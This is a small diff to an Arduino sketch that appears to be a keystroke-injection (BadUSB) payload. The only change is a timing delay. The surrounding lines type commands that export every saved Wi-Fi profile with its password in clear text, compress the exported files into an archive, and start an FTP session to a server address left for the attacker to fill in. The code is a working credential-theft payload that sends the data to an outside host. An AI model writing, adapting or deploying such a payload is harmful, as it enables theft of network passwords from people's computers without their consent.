@@ -55,7 +55,7 @@ void loop() {
   Keyboard.println("netsh wlan export profile folder=.\\tmp key=clear");
   delay(4500);
   Keyboard.println("Compress-Archive -Path ./tmp -DestinationPath ./tmp/tmp_archive.zip");
-  delay(5000);
+  delay(6500);
   Keyboard.println("ftp -i");
   delay(2000);
   // Put here your FTP server ADDRESS
